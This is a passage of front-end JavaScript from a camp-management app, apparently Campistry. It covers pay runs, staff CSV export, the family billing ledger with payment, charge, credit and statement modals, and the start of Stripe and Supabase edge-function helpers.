            (run.programPeople?'<span style="font-size:.72rem;color:var(--s400)">+ '+run.programHours+' h paid by program</span>':'')+
            '<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe.prDeleteRun(\''+esc(run.id)+'\')">✕</button>'+
            '</div></div>';
        h+='<div class="me-tw"><table class="me-t"><thead><tr><th>Name</th><th>Pay type</th><th>Hours</th><th>Gross</th><th>Method</th><th>Flags</th></tr></thead><tbody>';
        (run.lines||[]).forEach(function(l){
            var flags=[];
            if(l.unsigned)flags.push(l.unsigned+' unsigned');
            if(l.unsubmitted)flags.push(l.unsubmitted+' not submitted');
            h+='<tr><td class="bold">'+esc(l.name)+'</td>'+
               '<td style="font-size:.78rem">'+esc((core.PAY_TYPES.filter(function(p){return p.id===l.payType})[0]||{}).label||l.payType)+'</td>'+
               '<td>'+l.hours+'</td>'+
               '<td style="font-weight:700">'+(l.paidByProgram?'<span style="color:var(--s400);font-weight:500">Paid by program</span>':fm(l.gross))+'</td>'+
               '<td style="font-size:.78rem">'+esc(core.payMethodLabel(l.method))+'</td>'+
               '<td style="font-size:.72rem;color:var(--me)">'+esc(flags.join(' · '))+'</td></tr>';
        });
        h+='</tbody></table></div></div>';
    });
    return h;
}

function prNewRun(){
    var core=PC(); if(!core)return;
    if(!payroll.staff.length){toast('Add staff first','error');return}
    var to=_prToday(), from=_prShiftWeek(_prWeekStart(to),-1);
    var h=ff('From','runFrom',from,'date')+ff('To','runTo',to,'date');
    h+='<div class="fg"><label class="fl" style="display:flex;align-items:center;gap:7px;cursor:pointer"><input type="checkbox" id="runFinal"> Final period of the season</label>'+
        '<p style="font-size:.68rem;color:var(--s400);margin:2px 0 0">Flat stipends pay out on the final period only, so they don\'t repeat every run.</p></div>';
    h+='<p style="font-size:.72rem;color:var(--s400);margin:8px 0 0">Season salaries are divided across the number of runs you expect — set that below.</p>';
    h+=ff('Runs in the season','runPeriods','7','number');
    showModal('New Pay Run',h,function(){
        function v(id){var e=document.getElementById(id);return e?(e.value||'').trim():''}
        var f=v('runFrom'), t=v('runTo');
        if(!f||!t){toast('Pick both dates','error');return}
        if(f>t){toast('The end date is before the start date','error');return}
        var run=core.buildPayRun(payroll.staff,payroll.timesheets,{
            from:f, to:t,
            periodsInSeason:parseFloat(v('runPeriods'))||7,
            finalPeriod:!!(document.getElementById('runFinal')||{}).checked
        });
        run.id='run_'+Date.now();
        run.createdAt=new Date().toISOString();
        payroll.payRuns.push(run);
        closeModal('dynModal');
        _prTab='runs';
        save(); renderPayroll(); toast('Pay run created');
    });
}
async function prDeleteRun(id){
    var ok=await confirmDialog({title:'Delete Pay Run?',message:'This pay run will be deleted. The timesheets it was built from are kept.',confirmLabel:'Delete',danger:true});
    if(!ok)return;
    var idx=payroll.payRuns.findIndex(function(r){return r.id===id});
    var captured=idx>=0?payroll.payRuns[idx]:null;
    payroll.payRuns=payroll.payRuns.filter(function(r){return r.id!==id});
    save(); renderPayroll();
    toast('Pay run deleted','ok',{actionLabel:'Undo',onAction:function(){
        if(captured){if(idx>=0&&idx<=payroll.payRuns.length)payroll.payRuns.splice(idx,0,captured);else payroll.payRuns.push(captured);}
        save();renderPayroll();toast('Pay run restored');
    }});
}

function prExportCSV(){
    var core=PC(); if(!core)return;
    var today=_prToday();
    var rows=[['Name','Role','Date of Birth','Age','Pay Type','Rate','Paid By','Home Address','Summer Address',
               'Youth Corps','Participant ID','Working Papers','Orientation','Supervisor','Cleared']];
    payroll.staff.forEach(function(s){
        var yc=s.youthCorps||{};
        var res=yc.enrolled?core.participantChecklist(s,payroll.youthCorps,today):null;
        function addr(a){a=a||{};return [a.street,a.city,a.state,a.zip].filter(Boolean).join(', ')}
        rows.push([
            s.name||'', s.role||'', s.dob||'', core.ageOn(s.dob,today)==null?'':core.ageOn(s.dob,today),
            s.payType||'', s.payRate||0, core.payMethodLabel(s.paymentMethod),
            addr(s.homeAddress), s.summerAddressSameAsHome?'Same as home':addr(s.summerAddress),
            yc.enrolled?'Yes':'No', yc.participantId||'', yc.workingPapers?'Yes':'No',
            yc.orientationDate||'', yc.supervisorName||'',
            res?(res.clearedToWork?'Yes':'No'):''
        ]);
    });
    var csv='﻿'+rows.map(function(r){return r.map(function(v){return'"'+String(v==null?'':v).replace(/"/g,'""')+'"'}).join(',')}).join('\n');
    var blob=new Blob([csv],{type:'text/csv;charset=utf-8;'});
    var a=document.createElement('a');
    a.href=URL.createObjectURL(blob);
    a.download='payroll_'+today+'.csv';
    document.body.appendChild(a); a.click(); a.remove();
    setTimeout(function(){URL.revokeObjectURL(a.href)},1000);
    toast('Payroll exported');
}

function renderBilling(){
    var c=document.getElementById('page-billing');
    var highlightKey=_billHighlight; _billHighlight=null;
    var ledgers=buildFamilyLedgers();
    var famList=Object.values(ledgers).sort(function(a,b){return(a.family.name||'').localeCompare(b.family.name||'')});

    // Totals
    var totalCharged=0,totalCollected=0,totalOutstanding=0,overdueCount=0;
    famList.forEach(function(l){
        totalCharged+=l.totalCharges;
        totalCollected+=l.totalPayments;
        totalOutstanding+=Math.max(0,l.balance);
        if(l.status==='overdue') overdueCount++;
    });
    var rate=totalCharged>0?Math.round(totalCollected/totalCharged*100):0;
    var famWithBalance=famList.filter(function(l){return l.balance>0}).length;

    // ★ #5: payments not linked to any family are summed into Analytics revenue but
    //   EXCLUDED from these family-ledger totals (buildFamilyLedgers skips unmatched),
    //   so the Billing and Analytics tabs silently disagree. Surface the gap so the
    //   numbers reconcile: Collected (family-matched) + Unmatched = Analytics revenue.
    var _matchedPayIds={};
    famList.forEach(function(l){(l.entries||[]).forEach(function(en){if(en.type==='payment'&&en.ref!=null)_matchedPayIds[String(en.ref)]=1})});
    var _unmatchedPays=finPayments.filter(function(p){return !_matchedPayIds[String(p.id)]});
    var _unmatchedTotal=_unmatchedPays.reduce(function(s,p){return s+(Number(p.amount)||0)},0);

    var cardsOnFile=famList.filter(function(l){return families[l.famKey]?.cardOnFile}).length;
    var h='<div class="sec-hd"><div><h2 class="sec-title">Billing & Payments</h2><p class="sec-desc">'+famList.length+' account'+(famList.length!==1?'s':'')+' · '+cardsOnFile+' card'+(cardsOnFile!==1?'s':'')+' on file · '+finPayments.length+' payment'+(finPayments.length!==1?'s':'')+'</p></div><div class="sec-actions"><button class="me-btn me-btn--sec" onclick="CampistryMe.addCharge()">+ Charge</button><button class="me-btn me-btn--sec" onclick="CampistryMe.issueCredit()">+ Credit</button><button class="me-btn me-btn--pri" onclick="CampistryMe.openPaymentModal()">+ Payment</button>'+(cardsOnFile>0?'<button class="me-btn me-btn--pri" style="background:var(--purple)" onclick="CampistryMe.batchCharge()">⚡ Batch Charge</button>':'')+'</div></div>';

    // Stats
    h+='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(155px,1fr));gap:10px;margin-bottom:18px">';
    h+='<div style="background:#fff;border-radius:var(--r2);padding:14px 16px;border:1px solid var(--s200)"><div style="font-size:1.25rem;font-weight:800;color:var(--s800)">'+fm(totalCharged)+'</div><div style="font-size:.7rem;color:var(--s400);font-weight:600;text-transform:uppercase">Total Charged</div></div>';
    h+='<div style="background:#fff;border-radius:var(--r2);padding:14px 16px;border:1px solid var(--s200)"><div style="font-size:1.25rem;font-weight:800;color:var(--ok)">'+fm(totalCollected)+'</div><div style="font-size:.7rem;color:var(--s400);font-weight:600;text-transform:uppercase">Collected</div></div>';
    h+='<div style="background:#fff;border-radius:var(--r2);padding:14px 16px;border:1px solid var(--s200)"><div style="font-size:1.25rem;font-weight:800;color:var(--err)">'+fm(totalOutstanding)+'</div><div style="font-size:.7rem;color:var(--s400);font-weight:600;text-transform:uppercase">Outstanding</div></div>';
    h+='<div style="background:#fff;border-radius:var(--r2);padding:14px 16px;border:1px solid var(--s200)"><div style="font-size:1.25rem;font-weight:800;color:var(--s800)">'+rate+'%</div><div style="font-size:.7rem;color:var(--s400);font-weight:600;text-transform:uppercase">Collection Rate</div></div>';
    h+='<div style="background:#fff;border-radius:var(--r2);padding:14px 16px;border:1px solid '+(overdueCount>0?'var(--err)':'var(--s200)')+'"><div style="font-size:1.25rem;font-weight:800;color:'+(overdueCount>0?'var(--err)':'var(--s800)')+'">'+overdueCount+'</div><div style="font-size:.7rem;color:var(--s400);font-weight:600;text-transform:uppercase">Overdue</div></div>';
    if(_unmatchedTotal>0)h+='<div style="background:#fff;border-radius:var(--r2);padding:14px 16px;border:1px solid var(--me)" title="Payments not linked to any family. Included in Analytics revenue but NOT in the family ledgers above. Collected + Unmatched = Analytics revenue."><div style="font-size:1.25rem;font-weight:800;color:var(--me)">'+fm(_unmatchedTotal)+'</div><div style="font-size:.7rem;color:var(--s400);font-weight:600;text-transform:uppercase">Unmatched ('+_unmatchedPays.length+')</div></div>';
    h+='</div>';

    // Filter tabs
    h+='<div style="display:flex;gap:6px;margin-bottom:14px;flex-wrap:wrap">';
    var filters=[['all','All Accounts',famList.length],['outstanding','Outstanding',famWithBalance],['overdue','Overdue',overdueCount],['paid','Paid In Full',famList.filter(function(l){return l.status==='paid'}).length]];
    filters.forEach(function(f){
        var active=_billFilter===f[0];
        h+='<button class="me-btn '+(active?'me-btn--pri':'me-btn--sec')+' me-btn--sm" onclick="CampistryMe.setBillFilter(\''+f[0]+'\')">'+f[1]+' ('+f[2]+')</button>';
    });
    h+='</div>';

    // Family accounts
    var filtered=famList;
    if(_billFilter==='outstanding') filtered=famList.filter(function(l){return l.balance>0});
    else if(_billFilter==='overdue') filtered=famList.filter(function(l){return l.status==='overdue'});
    else if(_billFilter==='paid') filtered=famList.filter(function(l){return l.status==='paid'});

    if(!filtered.length){
        h+='<div class="me-empty"><h3>No accounts match this filter</h3></div>';
    } else {
        // Jumping to a specific family from search — force onto whichever page it lands on.
        if(highlightKey){
            var hIdx=filtered.findIndex(function(l){return l.famKey===highlightKey});
            if(hIdx>=0)_billingPage=Math.floor(hIdx/PAGE_SIZE)+1;
        }
        h+='<div id="billingBulkBar" style="display:none;align-items:center;gap:8px;padding:8px 12px;background:var(--me-bg,#eef2ff);border:1px solid var(--s200);border-radius:8px;margin-bottom:8px">'
            +'<span id="billingBulkCount" style="font-weight:700;font-size:.8rem;color:var(--s700)"></span>'
            +'<span style="flex:1"></span>'
            +'<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.bulkExportBilling()">↓ Export Selected</button>'
            +'</div>';
        var billPaged=_paginate(filtered,PAGE_SIZE,_billingPage);
        billPaged.items.forEach(function(l){
            var isHighlight=highlightKey&&l.famKey===highlightKey;
            var statusBadge=l.status==='paid'?bdg('Paid','ok'):l.status==='overdue'?bdg('Overdue','err'):l.status==='partial'?bdg('Partial','warn'):bdg('Pending','warn');
            var camperNames=(l.family.camperIds||[]).concat((l.pendingCamperIds||[]).map(function(n){return n+' (pending)'})).join(', ');

            h+='<div class="me-card" id="billfam-'+je(l.famKey)+'" style="margin-bottom:12px'+(isHighlight?';box-shadow:0 0 0 2px var(--me)':'')+'"><div class="me-card-head" style="cursor:pointer" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display===\'none\'?\'block\':\'none\'">';
            h+='<div style="display:flex;align-items:center;gap:12px;flex:1"><input type="checkbox" class="billing-check" data-famkey="'+esc(l.famKey)+'" onclick="event.stopPropagation();CampistryMe._updateBillingBulkBar()"><h3 style="margin:0">'+esc(l.family.name||'')+'</h3><span style="font-size:.75rem;color:var(--s400)">'+esc(camperNames)+'</span>'+(l.pendingEnrollment?bdg('Accepted — pending enrollment','warn'):'')+'</div>';
            h+='<div style="display:flex;align-items:center;gap:10px">'+statusBadge;
            h+='<span style="font-size:1rem;font-weight:800;color:'+(l.balance>0?'var(--err)':'var(--ok)')+'">'+fm(l.balance)+'</span>';
            h+='<span style="font-size:.7rem;color:var(--s400)">▼</span></div>';
            h+='</div>';

            // Ledger (collapsed by default, expanded when jumped to from search)
            h+='<div style="display:'+(isHighlight?'block':'none')+';padding:0">';

            // Ledger summary bar
            h+='<div style="display:flex;gap:16px;padding:10px 16px;background:var(--s50);border-bottom:1px solid var(--s100);font-size:.75rem">';
            h+='<span>Charges: <strong>'+fm(l.totalCharges)+'</strong></span>';
            h+='<span>Payments: <strong style="color:var(--ok)">'+fm(l.totalPayments)+'</strong></span>';
            if(l.totalCredits>0) h+='<span>Credits: <strong style="color:var(--purple)">'+fm(l.totalCredits)+'</strong></span>';
            h+='<span style="margin-left:auto">Balance: <strong style="color:'+(l.balance>0?'var(--err)':'var(--ok)')+'">'+fm(l.balance)+'</strong></span>';
            h+='</div>';

            // Ledger entries table
            if(l.entries.length){
                h+='<table class="me-t" style="margin:0"><thead><tr><th>Date</th><th>Type</th><th>Description</th><th style="text-align:right">Charge</th><th style="text-align:right">Payment</th><th>Status</th></tr></thead><tbody>';
                var runBal=0;
                l.entries.forEach(function(e){
                    if(e.type==='installment') return; // show in detail only
                    var isCharge=e.type==='charge';
                    var isPayment=e.type==='payment';
                    var isCredit=e.type==='credit';
                    var isRefund=isPayment&&e.amount<0;
                    if(isCharge) runBal+=e.amount;
                    if(isPayment||isCredit) runBal-=e.amount;
                    var payTxt=(isPayment||isCredit)?(isRefund?'−'+fm(Math.abs(e.amount)):fm(e.amount)):'';
                    var refBtn=(isPayment&&e.amount>0&&e.ref)?'<button class="me-btn me-btn--ghost me-btn--sm" title="Refund this payment" onclick="CampistryMe.finRefund(\''+je(String(e.ref))+'\')">↩</button>':'';
                    h+='<tr><td style="font-size:.75rem;color:var(--s500)">'+esc(e.date||'')+'</td>';
                    h+='<td>'+bdg(e.category||e.type,isCharge?'err':isRefund?'err':isPayment?'ok':'warn')+'</td>';
                    h+='<td style="font-size:.8rem">'+esc(e.desc||'')+'</td>';
                    h+='<td style="text-align:right;font-weight:600;color:var(--s800)">'+(isCharge?fm(e.amount):'')+'</td>';
                    h+='<td style="text-align:right;font-weight:600;color:'+(isRefund?'var(--err)':'var(--ok)')+'">'+payTxt+'</td>';
                    h+='<td style="text-align:right">'+refBtn+'</td></tr>';
                });
                h+='</tbody></table>';
            }

            // Installment schedule if any
            var installments=l.entries.filter(function(e){return e.type==='installment'});
            if(installments.length){
                h+='<div style="padding:10px 16px;border-top:1px solid var(--s100)"><div style="font-size:.75rem;font-weight:700;color:var(--s500);text-transform:uppercase;margin-bottom:6px">Payment Schedule</div>';
                h+='<div style="display:grid;gap:6px">';
                var today=new Date().toISOString().split('T')[0];
                installments.forEach(function(inst){
                    var isPastDue=inst.status==='pending'&&inst.date&&inst.date<today;
                    var bg=inst.status==='paid'?'var(--ok)':isPastDue?'var(--err)':'var(--s300)';
                    h+='<div style="display:flex;align-items:center;gap:10px;padding:6px 10px;border-radius:6px;background:var(--s50);font-size:.8rem">';
                    h+='<span style="width:8px;height:8px;border-radius:50%;background:'+bg+';flex-shrink:0"></span>';
                    h+='<span style="flex:1;font-weight:500">'+esc(inst.desc||inst.category)+'</span>';
                    h+='<span style="font-size:.75rem;color:var(--s500)">Due: '+esc(inst.date||'TBD')+'</span>';
                    h+='<span style="font-weight:700">'+fm(inst.amount)+'</span>';
                    h+=bdg(isPastDue?'Past Due':inst.status==='paid'?'Paid':'Pending',isPastDue?'err':inst.status==='paid'?'ok':'warn');
                    h+='</div>';
                });
                h+='</div></div>';
            }

            // Monthly plan / autopay
            h+=_planCardHtml(l);

            // Quick actions
            var hasCard=families[l.famKey]?.cardOnFile;
            h+='<div style="display:flex;gap:6px;padding:10px 16px;border-top:1px solid var(--s100);flex-wrap:wrap">';
            h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.openPaymentForFamily(\''+je(l.famKey)+'\')">Record Payment</button>';
            h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.sendPayLink(\''+je(l.famKey)+'\')">💳 Pay Link</button>';
            var _fam=families[l.famKey];
            if(!(_fam&&_fam.plan&&_fam.plan.installments&&_fam.plan.installments.length)) h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.monthlyPlan(\''+je(l.famKey)+'\')">📆 Monthly Plan</button>';
            if(hasCard&&l.balance>0) h+='<button class="me-btn me-btn--pri me-btn--sm" style="background:var(--purple)" onclick="CampistryMe.chargeStoredCard(\''+je(l.famKey)+'\')">⚡ Charge Card</button>';
            if(!hasCard) h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.requestCardSetup(\''+je(l.famKey)+'\')">💳 Save Card</button>';
            else h+='<span style="font-size:.7rem;color:var(--ok);font-weight:600;padding:4px 8px;align-self:center">💳 Card on file</span>';
            h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.addChargeForFamily(\''+je(l.famKey)+'\')">Add Charge</button>';
            h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.issueCreditForFamily(\''+je(l.famKey)+'\')">Issue Credit</button>';
            h+='<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.printStatement(\''+je(l.famKey)+'\')">Print Statement</button>';
            h+='<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.toggleBillingAccess(\''+je(l.famKey)+'\')">'+(families[l.famKey]?.billingAccessClosed?'Reopen billing access':'Close billing access')+'</button>';
            h+='</div>';

            h+='</div></div>'; // end collapsed, end card
        });
        h+=_pagerHtml(filtered.length,PAGE_SIZE,_billingPage,'setBillingPage');
    }

    c.innerHTML=h;
    if(highlightKey){
        var hEl=document.getElementById('billfam-'+highlightKey);
        if(hEl)hEl.scrollIntoView({behavior:'smooth',block:'center'});
    }
}

function setBillFilter(f){_billFilter=f;_billingPage=1;renderBilling()}
function _updateBillingBulkBar(){
    var n=document.querySelectorAll('.billing-check:checked').length;
    var bar=document.getElementById('billingBulkBar'); if(bar) bar.style.display=n?'flex':'none';
    var lbl=document.getElementById('billingBulkCount'); if(lbl) lbl.textContent=n+' selected';
}
function bulkExportBilling(){
    var famKeys=Array.prototype.map.call(document.querySelectorAll('.billing-check:checked'), function(cb){ return cb.dataset.famkey; });
    if(!famKeys.length){ toast('Select at least one account'); return; }
    var ledgers=buildFamilyLedgers();
    var headers=['Family','Campers','Charges','Payments','Balance','Status'];
    var csv='﻿'+headers.map(function(h){return'"'+h+'"'}).join(',')+'\n';
    var count=0;
    famKeys.forEach(function(fk){
        var l=ledgers[fk]; if(!l)return; count++;
        var camperNames=(l.family.camperIds||[]).concat((l.pendingCamperIds||[]).map(function(n){return n+' (pending)'})).join('; ');
        var row=[l.family.name||'',camperNames,l.totalCharges||0,l.totalPayments||0,l.balance||0,l.status||''];
        csv+=row.map(function(v){return'"'+String(v).replace(/"/g,'""')+'"'}).join(',')+'\n';
    });
    var a=document.createElement('a');
    a.href=URL.createObjectURL(new Blob([csv],{type:'text/csv'}));
    a.download='billing_'+new Date().toISOString().split('T')[0]+'.csv';
    a.click();
    toast('Exported '+count+' account'+(count!==1?'s':''));
}

function openPaymentModal(){openPaymentForFamily(null)}

function openPaymentForFamily(famKey){
    if(!_secEdit('billing','Recording a payment'))return;

    var famOpts='';
    if(famKey){
        var f=families[famKey];
        famOpts='<option value="'+esc(famKey)+'" selected>'+esc(f?f.name:'')+'</option>';
    } else {
        famOpts='<option value="">— Select Family —</option>';
        Object.entries(families).sort(function(a,b){return(a[1].name||'').localeCompare(b[1].name||'')}).forEach(function([k,f]){
            var bal=buildFamilyLedgers()[k]?.balance||0;
            famOpts+='<option value="'+esc(k)+'">'+esc(f.name)+(bal>0?' ('+fm(bal)+' due)':'')+'</option>';
        });
    }
    var today=new Date().toISOString().split('T')[0];
    var h='<div class="me-modal-form">';
    h+='<div class="me-field"><label>Family</label><select id="payFamKey" class="me-input">'+famOpts+'</select></div>';
    h+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">';
    h+='<div class="me-field"><label>Amount ($)</label><input type="number" id="payAmount" class="me-input" placeholder="0.00" step="0.01" min="0"></div>';
    h+='<div class="me-field"><label>Date</label><input type="date" id="payDate" class="me-input" value="'+today+'"></div>';
    h+='</div>';
    h+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">';
    h+='<div class="me-field"><label>Method</label><select id="payMethod" class="me-input">'+_payOptions('tuition')+'</select>'+_payBlockedNote('tuition')+'</div>';
    h+='<div class="me-field"><label>Reference #</label><input type="text" id="payRef" class="me-input" placeholder="Check #, confirmation, etc."></div>';
    h+='</div>';
    h+='<div class="me-field"><label>Notes (optional)</label><input type="text" id="payNotes" class="me-input" placeholder="e.g., June installment"></div>';
    h+='</div>';
    showModal('Record Payment',h,function(){
        var fk=document.getElementById('payFamKey').value;
        var f=families[fk];
        if(!fk||!f){toast('Select a family','error');return}
        var amt=parseFloat(document.getElementById('payAmount').value)||0;
        if(!amt){toast('Enter an amount','error');return}
        var date=document.getElementById('payDate').value;
        var method=document.getElementById('payMethod').value;
        // Guard the save path too — a stale tab or an edited DOM must not slip
        // a refused method (debit) past the picker.
        if(!_payAllowed(method,'tuition')){toast('That payment method isn\'t accepted for tuition.','error');return}
        var ref=document.getElementById('payRef').value.trim();
        var notes=document.getElementById('payNotes').value.trim();
        finPayments.push({id:'pay_'+Date.now(),family:f.name,familyKey:fk,amount:amt,date:date,method:method,reference:ref,notes:notes,timestamp:Date.now()});
        f.totalPaid=(f.totalPaid||0)+amt;
        f.balance=Math.max(0,(f.balance||0)-amt);
        save();closeModal('dynModal');renderBilling();toast('Payment of '+fm(amt)+' recorded for '+f.name);
    });
}

function addCharge(){
    if(!_secEdit('billing','Adding a charge'))return;
addChargeForFamily(null)}
function addChargeForFamily(famKey){
    var famOpts='';
    if(famKey){
        var f=families[famKey];
        famOpts='<option value="'+esc(famKey)+'" selected>'+esc(f?f.name:'')+'</option>';
    } else {
        famOpts='<option value="">— Select Family —</option>';
        Object.entries(families).sort(function(a,b){return(a[1].name||'').localeCompare(b[1].name||'')}).forEach(function([k,f]){
            famOpts+='<option value="'+esc(k)+'">'+esc(f.name)+'</option>';
        });
    }
    var today=new Date().toISOString().split('T')[0];
    var h='<div class="me-modal-form">';
    h+='<div class="me-field"><label>Family</label><select id="chgFamKey" class="me-input">'+famOpts+'</select></div>';
    h+='<div class="me-field"><label>Category</label><select id="chgCategory" class="me-input"><option>Activity Add-On</option><option>Trip Fee</option><option>Merchandise</option><option>Late Fee</option><option>Transportation</option><option>Materials</option><option>Convenience Fee</option><option>Other</option></select></div>';
    h+='<div style="display:grid;grid-template-columns:2fr 1fr;gap:10px">';
    h+='<div class="me-field"><label>Description</label><input type="text" id="chgDesc" class="me-input" placeholder="e.g., Horseback riding add-on"></div>';
    h+='<div class="me-field"><label>Amount ($)</label><input type="number" id="chgAmount" class="me-input" placeholder="0.00" step="0.01" min="0"></div>';
    h+='</div>';
    h+='<div class="me-field"><label>Date</label><input type="date" id="chgDate" class="me-input" value="'+today+'"></div>';
    h+='</div>';
    showModal('Add Charge',h,function(){
        var fk=document.getElementById('chgFamKey').value;
        var f=families[fk];
        if(!fk||!f){toast('Select a family','error');return}
        var amt=parseFloat(document.getElementById('chgAmount').value)||0;
        if(!amt){toast('Enter an amount','error');return}
        if(!f.charges) f.charges=[];
        f.charges.push({id:'chg_'+Date.now(),category:document.getElementById('chgCategory').value,description:document.getElementById('chgDesc').value.trim(),amount:amt,date:document.getElementById('chgDate').value,timestamp:Date.now()});
        f.balance=(f.balance||0)+amt;
        save();closeModal('dynModal');renderBilling();toast('Charge of '+fm(amt)+' added to '+f.name);
    });
}

function issueCredit(){issueCreditForFamily(null)}
function issueCreditForFamily(famKey){
    var famOpts='';
    if(famKey){
        var f=families[famKey];
        famOpts='<option value="'+esc(famKey)+'" selected>'+esc(f?f.name:'')+'</option>';
    } else {
        famOpts='<option value="">— Select Family —</option>';
        Object.entries(families).sort(function(a,b){return(a[1].name||'').localeCompare(b[1].name||'')}).forEach(function([k,f]){
            famOpts+='<option value="'+esc(k)+'">'+esc(f.name)+'</option>';
        });
    }
    var h='<div class="me-modal-form">';
    h+='<div class="me-field"><label>Family</label><select id="crFamKey" class="me-input">'+famOpts+'</select></div>';
    h+='<div style="display:grid;grid-template-columns:2fr 1fr;gap:10px">';
    h+='<div class="me-field"><label>Reason</label><input type="text" id="crReason" class="me-input" placeholder="e.g., Referral credit, adjustment"></div>';
    h+='<div class="me-field"><label>Amount ($)</label><input type="number" id="crAmount" class="me-input" placeholder="0.00" step="0.01" min="0"></div>';
    h+='</div></div>';
    showModal('Issue Credit',h,function(){
        var fk=document.getElementById('crFamKey').value;
        var f=families[fk];
        if(!fk||!f){toast('Select a family','error');return}
        var amt=parseFloat(document.getElementById('crAmount').value)||0;
        if(!amt){toast('Enter an amount','error');return}
        if(!f.credits) f.credits=[];
        f.credits.push({id:'cr_'+Date.now(),reason:document.getElementById('crReason').value.trim(),amount:amt,date:new Date().toISOString().split('T')[0],timestamp:Date.now()});
        f.balance=Math.max(0,(f.balance||0)-amt);
        save();closeModal('dynModal');renderBilling();toast('Credit of '+fm(amt)+' issued to '+f.name);
    });
}

function printStatement(famKey){
    var ledgers=buildFamilyLedgers();
    var l=ledgers[famKey];if(!l)return;
    var campName='';try{var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campName=s.camp_name||s.campName||'Camp'}catch(e){}
    var w=window.open('','_blank');
    var h='<!DOCTYPE html><html><head><title>Statement — '+esc(l.family.name)+'</title><style>body{font-family:Arial,sans-serif;font-size:10pt;margin:30px;color:#222}h1{font-size:16pt;margin-bottom:4px}h2{font-size:12pt;margin:20px 0 8px}table{width:100%;border-collapse:collapse;margin-bottom:16px}th{background:#f5f5f5;text-align:left;padding:6px;border:1px solid #ddd;font-size:9pt}td{padding:5px 6px;border:1px solid #ddd;font-size:9pt}.right{text-align:right}.bold{font-weight:bold}@media print{button{display:none}}</style></head><body>';
    h+='<h1>'+esc(campName)+'</h1><p style="color:#666;margin-bottom:20px">Statement for <strong>'+esc(l.family.name)+'</strong> · Generated '+new Date().toLocaleDateString()+'</p>';
    // Campers
    h+='<p>Campers: '+(l.family.camperIds||[]).map(function(n){return'<strong>'+esc(n)+'</strong>'}).join(', ')+'</p>';
    // Parent info
    var hh=(l.family.households||[])[0];
    if(hh){
        var pp=(hh.parents||[])[0];
        if(pp) h+='<p>'+esc(pp.name||'')+' · '+esc(pp.phone||'')+' · '+esc(pp.email||'')+'</p>';
        if(hh.address) h+='<p>'+esc(hh.address)+'</p>';
    }
    // Ledger
    h+='<h2>Account Activity</h2><table><thead><tr><th>Date</th><th>Type</th><th>Description</th><th class="right">Charges</th><th class="right">Payments/Credits</th></tr></thead><tbody>';
    l.entries.filter(function(e){return e.type!=='installment'}).forEach(function(e){
        var isCharge=e.type==='charge';
        h+='<tr><td>'+esc(e.date||'')+'</td><td>'+esc(e.category||e.type)+'</td><td>'+esc(e.desc||'')+'</td><td class="right">'+(isCharge?fm(e.amount):'')+'</td><td class="right bold" style="color:#16A34A">'+(isCharge?'':fm(e.amount))+'</td></tr>';
    });
    h+='<tr style="border-top:2px solid #333"><td colspan="3" class="bold">Balance Due</td><td colspan="2" class="right bold" style="font-size:12pt;color:'+(l.balance>0?'#DC2626':'#16A34A')+'">'+fm(l.balance)+'</td></tr>';
    h+='</tbody></table>';
    // Installment schedule
    var insts=l.entries.filter(function(e){return e.type==='installment'});
    if(insts.length){
        h+='<h2>Payment Schedule</h2><table><thead><tr><th>Installment</th><th>Due Date</th><th class="right">Amount</th><th>Status</th></tr></thead><tbody>';
        insts.forEach(function(i){h+='<tr><td>'+esc(i.category||i.desc)+'</td><td>'+esc(i.date||'')+'</td><td class="right bold">'+fm(i.amount)+'</td><td>'+esc(i.status||'pending')+'</td></tr>'});
        h+='</tbody></table>';
    }
    h+='<div style="margin-top:30px;text-align:center;color:#999;font-size:9pt">Powered by Campistry</div>';
    h+='<button onclick="window.print()" style="margin-top:20px;padding:8px 24px;cursor:pointer">Print</button></body></html>';
    w.document.write(h);w.document.close();
}

async function removePayment(idx){
    var ok=await confirmDialog({title:'Remove Payment?',message:'This will remove the payment record and adjust the family balance.',confirmLabel:'Remove',danger:true});
    if(!ok)return;
    var p=finPayments[idx];
    var captured=p?JSON.parse(JSON.stringify(p)):null;
    if(p){
        var f=Object.values(families).find(function(f){return f.name===p.family});
        if(f){f.totalPaid=Math.max(0,(f.totalPaid||0)-p.amount);f.balance=(f.balance||0)+p.amount}
    }
    finPayments.splice(idx,1);save();renderBilling();
    toast('Payment removed','ok',{actionLabel:'Undo',onAction:function(){
        if(captured){
            var f=Object.values(families).find(function(f){return f.name===captured.family});
            if(f){f.totalPaid=(f.totalPaid||0)+captured.amount;f.balance=Math.max(0,(f.balance||0)-captured.amount)}
            finPayments.splice(idx,0,captured);
        }
        save();renderBilling();toast('Payment restored');
    }});
}

// ═══════════════════════════════════════════════════════════════
// STRIPE INTEGRATION — Save cards, charge stored cards
// ═══════════════════════════════════════════════════════════════
function getSupabaseUrl(){return window.__CAMPISTRY_SUPABASE__?.url||''}
function getSupabaseKey(){return window.__CAMPISTRY_SUPABASE__?.anonKey||''}
function getStripePublishableKey(){
    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
    return(s.campistryMe&&s.campistryMe.stripePublishableKey)||'';
}
function getCampId(){return localStorage.getItem('campistry_camp_id')||''}

async function callEdgeFunction(fnName,body){
    var url=getSupabaseUrl()+'/functions/v1/'+fnName;
    var resp=await fetch(url,{
        method:'POST',
        headers:{'Content-Type':'application/json','Authorization':'Bearer '+getSupabaseKey(),'apikey':getSupabaseKey()},
        body:JSON.stringify(body)
    });
    var data=await resp.json();
    if(!resp.ok||data.error) throw new Error(data.error||'Edge function error');
    return data;
}

// For edge functions that re-verify the CALLER's own role server-side
// (send-broadcast, send-sms) — those need the signed-in user's own session
// token, not the anon key callEdgeFunction sends. .functions.invoke()
